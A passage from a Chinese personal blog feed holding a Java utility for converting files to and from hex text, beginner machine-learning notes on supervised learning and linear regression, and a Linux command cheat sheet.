string">"目录："</span> <span class="token operator">+</span> directory <span class="token operator">+</span> <span class="token string">", 名称："</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">;</span><span class="token comment">//字节数组长度</span>    <span class="token class-name">File</span> writeTxt <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">BufferedWriter</span> textWriter <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>end<span class="token punctuation">)</span> <span class="token punctuation">{</span>        nameTmp <span class="token operator">=</span> curTxtPath<span class="token punctuation">;</span>        curTxtPath <span class="token operator">=</span> directory <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> name <span class="token operator">+</span> n <span class="token operator">+</span> <span class="token string">".txt"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nameTmp <span class="token operator">!=</span> curTxtPath<span class="token punctuation">)</span> <span class="token punctuation">{</span>            writeTxt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>curTxtPath<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>writeTxt<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                writeTxt<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            writeTxt<span class="token punctuation">.</span><span class="token function">createNewFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"创建新文件："</span> <span class="token operator">+</span> curTxtPath<span class="token punctuation">)</span><span class="token punctuation">;</span>            textWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedWriter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileWriter</span><span class="token punctuation">(</span>writeTxt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bys <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> fis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bys<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bys<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token function">bytes2HexString</span><span class="token punctuation">(</span>len<span class="token punctuation">,</span> bys<span class="token punctuation">)</span><span class="token punctuation">;</span>            textWriter<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>            m<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">&gt;</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>                m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        end <span class="token operator">=</span> len <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        textWriter<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        n<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//字节数组转 16 进制字符串</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">bytes2HexString</span><span class="token punctuation">(</span><span class="token keyword">int</span> len<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">HEX</span> <span class="token operator">=</span> <span class="token string">"0123456789abcdef"</span><span class="token punctuation">;</span>    <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span>bytes<span class="token punctuation">.</span>length <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 取出这个字节的高 4 位，然后与 0x0f 与运算，得到一个 0-15 之间的数据，通过 HEX.charAt(0-15)即为 16 进制数</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token constant">HEX</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token punctuation">(</span>bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 取出这个字节的低位，与 0x0f 与运算，得到一个 0-15 之间的数据，通过 HEX.charAt(0-15)即为 16 进制数</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token constant">HEX</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// txt 转文件</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">text2File</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token class-name">String</span> txtPath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>    <span class="token class-name">File</span> outFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">File</span> writeTxt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>txtPath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>outFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        outFile<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>writeTxt<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>writeTxt<span class="token punctuation">.</span><span class="token function">isFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"文件不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token class-name">BufferedReader</span> textReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>writeTxt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>outFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> line <span class="token operator">=</span> textReader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"line length: "</span> <span class="token operator">+</span> line<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>line <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bys <span class="token operator">=</span> <span class="token function">hexString2Bytes</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>        fos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bys<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bys<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        line <span class="token operator">=</span> textReader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    textReader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 16 进制字符串转字节数组</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">hexString2Bytes</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>len <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 两位一组，表示一个字节,把这样表示的 16 进制字符串，还原成一个字节</span>        b<span class="token punctuation">[</span>i <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">digit</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">digit</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="http://wx1.sinaimg.cn/mw690/a6e9cb00gy1fl508t2zo7j20c60cadh0.jpg" alt="文本内容"></p><p>可以看到，这种方式转化的 txt 文件内容灰常灰常的密集！<br>密集恐惧症勿喷。。。文件大小缩小了很多很多！</p><h2 id="新的疑问"><a href="#新的疑问" class="headerlink" title="新的疑问"></a>新的疑问</h2><p>细心的朋友可能会发现，刚才的 txt 文件大小刚好是原文件大小的 2 倍。<br>所以，是不是还有更高效的方法呢？比如转化后的数据大小跟原文件一模一样？</p><h3 id="基于上述想法，我做了个测试："><a href="#基于上述想法，我做了个测试：" class="headerlink" title="基于上述想法，我做了个测试："></a>基于上述想法，我做了个测试：</h3><ol><li>将原文件后缀改为“.txt”。</li><li>用文本编辑器打开后可以看到也是十六进制数据，而且还有空格和换行。</li><li>将这些文本复制到虚拟机中的 txt 中。</li><li>将虚拟机中的 txt 文件后缀改为原文件后缀。</li><li>此时打不开文件了，并且文件大小也发生了变化。</li></ol><p>我现在还不知道是什么原因，只有一些猜测：</p><ol><li>系统位数不行</li><li>平台不同</li><li>编码不同</li></ol><p>虽然暂时不可以，但我还是相信可以做到！</p><p>所以我想问下，有人知道这个数据格式叫啥名么？或者有人知道如何将字节数组转化成这种格式吗？</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> I/O 流 </tag>
            
            <tag> 输入输出流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习(1)</title>
      <link href="/2017/10/02/machinelearning/"/>
      <url>/2017/10/02/machinelearning/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是机器学习"><a href="#什么是机器学习" class="headerlink" title="什么是机器学习"></a>什么是机器学习</h2><p>Arthur Samuel 将其描述为：“学习领域，使计算机能够在没有被明确编程的情况下学习”。 这是一个较老的非正式的定义。</p><p>Tom Mitchell 提供了一个更现代化的<font color="red"><strong>定义：<br>一个程序被认为能从经验 E 中学习，解决任务 T，达到性能度量值 P，当且仅当，有了经验 E 后，经过 P 评判，程序在处理 T 时的性能有所提升。</strong></font></p><span id="more"></span><h4 id="Example-playing-checkers"><a href="#Example-playing-checkers" class="headerlink" title="Example: playing checkers."></a>Example: playing checkers.</h4><ul><li>E = the experience of playing many games of checkers.</li><li>T = the task of playing checkers.</li><li>P = the probability that the program will win the next game.</li></ul><p>一般来说，任何机器学习问题都可以分配到两个广泛的分类之一，「<strong>监督学习</strong>」和「<strong>无监督学习</strong>」。</p><ul><li>监督学习是指，我们将教计算机如何去完成任务；</li><li>而在无监督学习中，我们打算让计算机自己进行学习。</li></ul><br>### 监督学习<p>在监督学习中，我们获得了一个数据集，并且已经知道我们正确的输出应该是什么样子的，这就意味着输入和输出之间有一个关系。</p><p>受监督的学习问题分为“回归”和“分类”问题。在回归问题中，我们试图在连续输出中预测结果，这意味着我们正在尝试将输入变量映射到一些连续函数。在分类问题中，我们试图用离散输出来预测结果。换句话说，我们正在尝试将输入变量映射到离散类别。</p><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h4><ul><li>Given data about the size of houses on the real estate market, try to predict their price. Price as a function of size is a continuous output, so this is a regression problem.</li><li>We could turn this example into a classification problem by instead making our output about whether the house “sells for more or less than the asking price.” Here we are classifying the houses based on price into two discrete categories.</li></ul><h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h4><ul><li>Regression - Given a picture of a person, we have to predict their age on the basis of the given picture</li><li>Classification - Given a patient with a tumor, we have to predict whether the tumor is malignant or benign.</li></ul><br>### 无监督学习对于监督学习中的每一个样本，我们已经被清楚地告知了什么是所谓的正确答案；<p>在无监督学习中，我们用的数据会和监督学习里的看起来有些不一样，没有属性或标签这一概念。也就是说所有的数据都是一样的，没有区别。</p><p>无监督学习使我们能够解决那种我们不知道结果具体应该是什么样的问题。我们可以从数据导出结构，我们没必要知道变量的影响。<br>我们可以通过基于数据中的变量之间的关系对数据进行聚类来导出该结构。在无监督学习的情况下，没有基于预测结果的反馈。</p><p>所以在无监督学习中，我们只有一个数据集，没人告诉我们该怎么做，我们也不知道每个数据点究竟是什么意思。相反，它只告诉我们现在有一个数据集，你能在其中找到某种结构吗？</p><p><code>[W,s,v] = svd((repmat(sum(x.*x,1),size(x,1),1).*x)*x');</code></p><br>## 模型表示先介绍一些**符号：**<ul><li>Number of training examples = \(m\)（训练样本数目）</li><li>“input” variable/features = \(x\)’s（输入变量/特征量）</li><li>“output” variable/“target” variable = \(y\)’s（输出变量/目标变量/预测结果）</li><li>One training example = \((x,y)\)（一个训练样本）</li><li>表示<font color="red">第 \(i\) 个</font>训练样本使用\((x^{(i)},y^{(i)})\)</li></ul><blockquote><p><strong>强调！</strong><font color="red">这里的 \(i\) 不是求幂运算！</font></p></blockquote><p><strong>学习算法</strong>的工作：把一个训练集喂给学习算法，然后输出一个函数 \(h\) (hypothesis 假设)。</p><blockquote><p>例如 \(h\) 是预测房价的学习算法生成的函数，将房屋尺寸大小输入给 \(h\)，\(h\) 根据输入的 \(x\) 值来得出 \(y\) 值，\(y\) 值对应房子的价格，因此 \(h\) 是一个从 \(x\) 到 \(y\) 的函数映射。</p></blockquote><p>设计学习算法的时候，我们需要思考的就是如何得到这个假设 \(h\)。</p><br>### 线性回归模型 linear regression线性方程是简单的形式，所以我们将先从线性方程的例子入手，例如下面这个模型：$$h_\theta(x)=\theta_0+\theta_1x$$这个模型是个单变量线性回归模型，在前面说到的预测房价例子中，\\(h\\) 就是根据 \\(x\\) 来预测所有价格的函数。]]></content>
      
      
      <categories>
          
          <category> Machine Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux Common Commands</title>
      <link href="/2017/09/14/linuxcommoncommands/"/>
      <url>/2017/09/14/linuxcommoncommands/</url>
      
        <content type="html"><![CDATA[<p>最近在用 Mac 电脑，系统跟 Linux 有些相似，所以整理下常用的命令以备不时之需。</p><span id="more"></span><h2 id="File-Commands"><a href="#File-Commands" class="headerlink" title="File Commands"></a>File Commands</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> - directory listing<span class="token function">ls</span> <span class="token parameter variable">-al</span> <span class="token operator">=</span> formatted listing with hidden files<span class="token builtin class-name">cd</span> <span class="token function">dir</span> - change directory to <span class="token function">dir</span><span class="token builtin class-name">cd</span> - change to home<span class="token builtin class-name">pwd</span> - show current directory<span class="token function">mkdir</span> <span class="token function">dir</span> - create directory <span class="token function">dir</span><span class="token function">rm</span> <span class="token function">file</span> - delete <span class="token function">file</span><span class="token function">rm</span> <span class="token parameter variable">-r</span> <span class="token function">dir</span> - delete directory <span class="token function">dir</span><span class="token function">rm</span> <span class="token parameter variable">-f</span> <span class="token function">file</span> - force remove <span class="token function">file</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token function">dir</span> - remove directory <span class="token function">dir</span><span class="token function">cp</span> file1 file2 - copy file1 to file2<span class="token function">mv</span> file1 file2 - <span class="token function">rename</span> file1 to file2<span class="token function">ln</span> <span class="token parameter variable">-s</span> <span class="token function">file</span> <span class="token function">link</span> - create symbolic <span class="token function">link</span> <span class="token string">'link'</span> to <span class="token function">file</span><span class="token function">touch</span> <span class="token function">file</span> - create or update <span class="token function">file</span><span class="token function">cat</span> <span class="token operator">&gt;</span> <span class="token function">file</span> - place standard input into <span class="token function">file</span><span class="token function">more</span> <span class="token function">file</span> - output the contents of the <span class="token function">file</span><span class="token function">less</span> <span class="token function">file</span> - output the contents of the <span class="token function">file</span><span class="token function">head</span> <span class="token function">file</span> - output first <span class="token number">10</span> lines of <span class="token function">file</span><span class="token function">tail</span> <span class="token function">file</span> - output last <span class="token number">10</span> lines of <span class="token function">file</span><span class="token function">tail</span> <span class="token parameter variable">-f</span> <span class="token function">file</span> - output contents of <span class="token function">file</span> as it grows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> user@host - connet to <span class="token function">host</span> as user<span class="token function">ssh</span> <span class="token parameter variable">-p</span> port user@host - connect using port p<span class="token function">ssh</span> <span class="token parameter variable">-D</span> port user@host - connect and use <span class="token builtin class-name">bind</span> port<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="NetWork"><a href="#NetWork" class="headerlink" title="NetWork"></a>NetWork</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token function">host</span> - <span class="token function">ping</span> <span class="token function">host</span> <span class="token string">'host'</span>whois domain - get whois <span class="token keyword">for</span> domain<span class="token function">dig</span> domain - get whois <span class="token keyword">for</span> domain<span class="token function">dig</span> <span class="token parameter variable">-x</span> <span class="token function">host</span> - reverse lookup <span class="token function">host</span><span class="token function">wget</span> <span class="token function">file</span> - download <span class="token function">file</span><span class="token function">wget</span> <span class="token parameter variable">-c</span> <span class="token function">file</span> - <span class="token builtin class-name">continue</span> stopped download<span class="token function">wget</span> <span class="token parameter variable">-r</span> url - recursively download files from url<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="System-Info"><a href="#System-Info" class="headerlink" title="System Info"></a>System Info</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">date</span> - show current date/time<span class="token function">cal</span> - show this month's calendar<span class="token function">uptime</span> - show <span class="token function">uptime</span>w - display <span class="token function">who</span> is online<span class="token function">whoami</span> - <span class="token function">who</span> are you logged <span class="token keyword">in</span> as<span class="token function">uname</span> <span class="token parameter variable">-a</span> - show kernel config<span class="token function">cat</span> /proc/cpuinfo - cpu info<span class="token function">cat</span> /proc/meminfo - memory information<span class="token function">man</span> <span class="token builtin class-name">command</span> - show manual <span class="token keyword">for</span> <span class="token builtin class-name">command</span><span class="token function">df</span> - show disk usage<span class="token function">du</span> - show directory space usage<span class="token function">du</span> <span class="token parameter variable">-sh</span> - human readable size <span class="token keyword">in</span> GB<span class="token function">free</span> - show memory and swap usage<span class="token function">whereis</span> app - show possible locations of app<span class="token function">which</span> app - show <span class="token function">which</span> app will be run by default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Searching"><a href="#Searching" class="headerlink" title="Searching"></a>Searching</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> pattern files - search <span class="token keyword">for</span> <span class="token for-or-select variable">pattern</span> <span class="token keyword">in</span> files<span class="token function">grep</span> <span class="token parameter variable">-r</span> pattern <span class="token function">dir</span> - search recursively <span class="token keyword">for</span> <span class="token for-or-select variable">pattern</span> <span class="token keyword">in</span> <span class="token function">dir</span><span class="token builtin class-name">command</span> <span class="token operator">|</span> <span class="token function">grep</span> pattern - search <span class="token keyword">for</span> <span class="token for-or-select variable">pattern</span> <span class="token keyword">in</span> <span class="token function">dir</span><span class="token function">locate</span> <span class="token function">file</span> - <span class="token function">find</span> all instances of <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Process-Management"><a href="#Process-Management" class="headerlink" title="Process Management"></a>Process Management</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> - display currently active processes<span class="token function">ps</span> aux - <span class="token function">ps</span> with a lot of detail<span class="token function">lsof</span> <span class="token parameter variable">-i</span> tcp:1099<span class="token function">kill</span> pid - <span class="token function">kill</span> process with pid <span class="token string">'pid'</span><span class="token function">killall</span> proc - <span class="token function">kill</span> all processes named proc<span class="token function">bg</span> - lists stopped/background jobs, resume stopped job <span class="token keyword">in</span> the background<span class="token function">fg</span> - bring <span class="token function">most</span> recent job to foreground<span class="token function">fg</span> n - brings job n to foreground<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="File-Permissions"><a href="#File-Permissions" class="headerlink" title="File Permissions"></a>File Permissions</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> octal <span class="token function">file</span> - change permission of <span class="token function">file</span>    <span class="token number">4</span> - read<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    <span class="token number">2</span> - write<span class="token punctuation">(</span>w<span class="token punctuation">)</span>    <span class="token number">1</span> - execute<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        order: owner/group/world        eg:    <span class="token function">chmod</span> <span class="token number">777</span> - rwx <span class="token keyword">for</span> everyone    <span class="token function">chmod</span> <span class="token number">755</span> - rw <span class="token keyword">for</span> owner, rx <span class="token keyword">for</span> group/world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Compression"><a href="#Compression" class="headerlink" title="Compression"></a>Compression</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> cf file.tar files - <span class="token function">tar</span> files into file.tar<span class="token function">tar</span> xf file.tar - untar into current directory<span class="token function">tar</span> tf file.tar - show contents of archive    <span class="token function">tar</span> flags:    c - create archive    t - table of contents    x - specifies filename    z - use zip/gzip    j - <span class="token function">bzip2</span> compression    k - <span class="token keyword">do</span> not overwrite    T - files from <span class="token function">file</span>    w - ask <span class="token keyword">for</span> confirmation    <span class="token function">v</span> - verbose<span class="token function">gzip</span> <span class="token function">file</span> - compress <span class="token function">file</span> and <span class="token function">rename</span> to file.gz<span class="token function">gzip</span> <span class="token parameter variable">-d</span> file.gz - decompress file.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Shortcuts"><a href="#Shortcuts" class="headerlink" title="Shortcuts"></a>Shortcuts</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ctrl+c - halts current <span class="token builtin class-name">command</span>ctrl+z - stops current <span class="token builtin class-name">command</span><span class="token function">fg</span> - resume stopped <span class="token builtin class-name">command</span> <span class="token keyword">in</span> foreground<span class="token function">bg</span> - resume stopped <span class="token builtin class-name">command</span> <span class="token keyword">in</span> backgroundctrl+d - log out of current sessionctrl+w - erases one word <span class="token keyword">in</span> current linectrl+u - erases whole linectrl+r - reverse lookup of previous commands<span class="token operator">!</span><span class="token operator">!</span> - repeat last <span class="token builtin class-name">command</span><span class="token builtin class-name">exit</span> - log out of current session<span aria-hidden="true" 